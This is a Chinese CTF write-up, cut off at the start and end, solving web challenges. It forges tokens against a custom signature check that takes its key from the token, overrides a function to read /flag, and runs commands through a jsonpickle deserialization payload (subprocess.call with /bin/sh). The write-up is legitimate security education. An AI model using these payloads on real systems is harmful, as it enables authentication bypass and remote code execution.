punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            data_bytes <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>  <span class="token comment"># data</span>            encoded_data2 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>signature<span class="token punctuation">)</span>  <span class="token comment"># signature</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>encoded_data2<span class="token punctuation">)</span>            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>            encoded_data4 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span>  <span class="token comment"># public_key</span>            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data4<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>            <span class="token keyword">return</span> encoded_data        <span class="token keyword">else</span><span class="token punctuation">:</span>            hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>            data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>            hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>            signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            encoded_data1 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>inputdata<span class="token punctuation">)</span>  <span class="token comment"># data</span>            encoded_data3 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>alg<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># alg</span>            encoded_data <span class="token operator">=</span> encoded_data1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> encoded_data3<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The encoded data is: "</span><span class="token punctuation">,</span> encoded_data<span class="token punctuation">)</span>            <span class="token keyword">return</span> encoded_data        <span class="token keyword">def</span> <span class="token function">sign_data</span><span class="token punctuation">(</span>private_key<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>private_key<span class="token punctuation">)</span>    <span class="token comment"># 将JSON数据转换为字符串</span>    data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    signature <span class="token operator">=</span> pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>sign<span class="token punctuation">(</span>hash_obj<span class="token punctuation">)</span>    <span class="token keyword">return</span> signature<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后是decode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">data_decode</span><span class="token punctuation">(</span>encode_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        all_data <span class="token operator">=</span> encode_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span>        sig_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>        data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        json_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>sig_bytes<span class="token punctuation">)</span>        alg <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>all_data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        key <span class="token operator">=</span> secret        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span>        <span class="token comment"># 验证签名</span>        is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span>        <span class="token keyword">if</span> is_valid<span class="token punctuation">:</span>            <span class="token keyword">return</span> json_data        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> <span class="token string">"something error"</span>        <span class="token keyword">def</span> <span class="token function">verify_signature</span><span class="token punctuation">(</span>secret<span class="token punctuation">,</span> data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> alg <span class="token operator">==</span> <span class="token string">'RS'</span><span class="token punctuation">:</span>        rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>import_key<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>        <span class="token comment"># 将JSON数据转换为字符串</span>        data_str <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>hash_obj<span class="token punctuation">,</span> signature<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is valid. Transmitted data:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is invalid."</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">elif</span> alg <span class="token operator">==</span> <span class="token string">'HS'</span><span class="token punctuation">:</span>        hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>        data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>        hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>        hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> hex_dig <span class="token operator">==</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一开始看到有 RS 有 HS，欸是不是要打 RS 转 HS 的 trick 🤓👆</p><p>拿个 token 解码测试一下</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;"username": "aaa", "password": "123"&#125;iÛÕ`Ø&#125;£P5À..ï.Ì.¬?%ÐºFU=×.UT.è57 a8Î¿./òLkntãÝ_©....àm¥£.à-uqð~ºÀ¦Õ.·.äÃº...0..¿#ÐÒfVuºÔÙgdðõ%Æìy.Ì.«..v.§~..cßà®².=Ùq#.0ò..Q.¬û.WÌ¶º0Ô.¼ëöþ)¨.òOÛ?ýv´¦.Ë7.d...Øc©.é..1..%ñ.9á&#125;Öû.NÂ.¤v.ü6.ÂÐY.v¿.ðfâ....Ä²¬|Ç´½.º.O.jîíÝq.®G`Ê.ïÅËhã.¯.&lt;\z¯å¨.~q2è|Ä[ãp.&lt;®ç².ùRS-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0IdDl+WgYW49pk+UCoYypX4SPvon3Pc9uNgM6htf63pYUKnqcFjm0LqAd5q/+t5Ut5L1P98IZRyRjYF/W98WrLWQpG2Y2WiQ4/stCx/qtCg+UGoG7ItWMKrUAWxjjwzqun++yZIQ02AeLJzUSbC+uEEBqvzkXrr4FJvPHpIbWU/hE23nEmRL5pze8I7zym7M38Q3doOPSTsQV15b0Kcppt5Fvn3TxQAlWmdARk0sY0GbR/oo80eniQvIlswbPGeORgldbXLY1IAusaTiIenQJVU9+//+D9m7OZdoGOeqPLJ7jns9bTX8qwkjtuH0pDREK4Rr+vBFYKSc/TfXraNc+wIDAQAB-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到RS加密的公钥</p><p>下断点看一下all_data</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">0</span> <span class="token operator">=</span><span class="token string">'eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMTIzIn0='</span><span class="token number">1</span> <span class="token operator">=</span><span class="token string">'nDnHSpDbV3CVBn24/aZQc3lOdxQug5w5zj93isQYXyViMeRLqNPu53sZNGxEjL2rd55B4H7Cc+gQ2x4f/NcZQ8ACVDgtQe5C4be1y7uan2qitc4eQGCkbmmDQeogdJteJCzHeZaePp3Vg9/+U+588A1eQS1/UG5vDawVGLel5UYH6nmZha0zZ2CbrNBbbu3SPaeGDsj/mJscssETStFGx8iEYra3eYh9L3ugEUcP/7D4EVi1EKeu98Mc6IwnwjgxsdmihpuZRZlSI1NUi+TfbjLBLb57WH9dhKOQAr06xO/HhL3U73D8kdVCKCWXMolZZXw8eIkfuvS+5QUNWM7DwQ=='</span><span class="token number">2</span> <span class="token operator">=</span><span class="token string">'UlM='</span><span class="token number">3</span> <span class="token operator">=</span><span class="token string">'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyZVVmNzNDVlJPL3RwYjVLSnQ0QgptY2xDSUtWMXNrZGtkQWcwS2I5RGlrRjREeXBwODFLb0hFd2VIUUxRS0RnR0RzZnpQeFI4Qm1vQmV1TlBVZkg2CkRuVDdEQ2dRSlVpaDBVd3hRYVprZWprWW9kY1RZTG9QSlpZK1BnSjRaKzFNZWFOK1FFRG1aUjEzTU5kMy9OaE0KejY3Tk1GYWVaVm1LN2FQQzh5blJXRzVPbFZpU0JDNDUxOG9TcVhsRkx3MU5CR2pnb1N2ZS9FU2VoUStuTlUvdgpwaU1sNnVtUzhZbjlZVytrMU0vbGJ3TWc1N3lydXRGYVh2WmllUG4zSENrd0YzTUF0RkpadEVOL3huaU1FU3pPClZBVmFYZ3EwWHVTYXJZSXU4b2dvU2Q4MUdLNGJmWHdscTZWbXNWSExQRFBvMkRrTmcxS1B2L1Erd05vbHI1SlkKTHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>好猜测要让解密方式为 HS</del></p><p>0 改为 eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ&#x3D;&#x3D;</p><p>2 改为 SFM&#x3D;&#x3D;</p><p><del>签名部分就是获取的公钥</del></p><p>构造出jwt：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ<span class="token operator">==</span><span class="token punctuation">.</span>SFM<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是失败了</p><p>观察 HS 的加解密部分：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># enc</span>hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># dec</span>hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现要先知道 secret 的值才能伪造</p><br><p>而且这里的加密逻辑都是它自己实现的，不能套用常规的 jwt 思路把 RS 转为 HS</p><p>仔细一看对 secret 的操作</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> secret<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>    key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span><span class="token comment"># 验证签名</span>is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>草了，这里传进去的 key 就是公钥，和 secret 没有半点关系，那就简单了，加解密只和算法有关</p><p>尝试直接在本地解除限制生成 admin 的 token ，带到靶机上，发现可以登录</p><p>然后就拿到 exec 了，接下来的问题是靶机不出网而 <code>print(exec(code))</code> 没有回显</p><p>一开始想的是用 sctf 的 trick 在 wsgi server 写内存马，但是整了半天拿不到全局 __globals__，浪费了非常久的时间</p><p>最后还是选择找个有调用的方法重写，这里重写 read_html 方法来读flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">util<span class="token punctuation">.</span>read_html<span class="token operator">=</span><span class="token keyword">lambda</span><span class="token operator">+</span>filename<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token operator">+</span>f<span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241205132441508.png" alt="image-20241205132441508"></p><p>然后随便访问一个调用了 read_html 接口即可回显</p><h3 id="法二：pyramid内存马"><a href="#法二：pyramid内存马" class="headerlink" title="法二：pyramid内存马"></a>法二：pyramid内存马</h3><p>参考：<a href="https://forum.butian.net/share/3974">https://forum.butian.net/share/3974</a></p><hr><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>尝试登录可以得到账密 guest:guest</p><p>登录后得到 token，解码得到</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"__main__.Token"</span><span class="token punctuation">,</span> <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token number">1733378883.1952913</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>除此之外没有其他信息</p><p>py&#x2F;object 的部分是数据类的写法，在这里测了半天类一直返回500</p><p>github 上搜了一下找到个相关的项目：<a href="https://github.com/jsonpickle/jsonpickle">https://github.com/jsonpickle/jsonpickle</a></p><p>和队友讨论了很久之后猜测是在 timestamp 上做文章，因为每次登录之后都会生成一个 timestamp 可以反复使用，返回 welcome，过一阵时间后就会返回 Invalid token，而当我们直接把 username 改为 admin 的时候就会直接返回 Invalid token</p><p>于是需要爆破 timestamp ，这里我交给队友用 yakit 爆出一个 token 就能持久化使用了</p><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206091629415.png" alt="image-20241206091629415"></p><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206093000087.png" alt="image-20241206093000087"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>    <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span><span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后呢，很明显是要打 jsonpickle 了，有官方的 fuzzing 文档：<a href="https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md">https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md</a></p><p>貌似没啥用</p><p>继续在 github 上搜索：</p><p><a href="https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md">https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md</a></p><p><a href="https://github.com/VerSprite/flask-json-pickle">https://github.com/VerSprite/flask-json-pickle</a></p><p><a href="https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/">https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/</a></p><p>测试发现 ban 了 reduce、tuple，不过注意到 py&#x2F;object 这里能自己选择类，那么就可以考虑直接调用命令执行类<code>subprocess.call</code></p><p>传入参数可以用 py&#x2F;newargsex</p><p>无回显，一开始想用盲注读文件的，但是发现反斜杠被 ban 了，那么就很难搞了</p><p>测试发现有个 static 文件夹可以访问，那么直接带外</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"subprocess.call"</span><span class="token punctuation">,</span> <span class="token property">"py/newargsex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat$&#123;IFS&#125;/app/app.py>/app/static/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"stdout"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>源码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> time <span class="token keyword">import</span> time<span class="token keyword">import</span> jsonpickle<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> os<span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    username<span class="token punctuation">:</span> <span class="token builtin">str</span>    password<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Token</span><span class="token punctuation">:</span>    username<span class="token punctuation">:</span> <span class="token builtin">str</span>    timestamp<span class="token punctuation">:</span> <span class="token builtin">int</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token punctuation">[</span>User<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> User<span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>BLACKLIST <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'repr'</span><span class="token punctuation">,</span>    <span class="token string">'state'</span><span class="token punctuation">,</span>    <span class="token string">'json'</span><span class="token punctuation">,</span>    <span class="token string">'reduce'</span><span class="token punctuation">,</span>    <span class="token string">'tuple'</span><span class="token punctuation">,</span>    <span class="token string">'nt'</span><span class="token punctuation">,</span>    <span class="token string">'\\'</span><span class="token punctuation">,</span>    <span class="token string">'builtins'</span><span class="token punctuation">,</span>    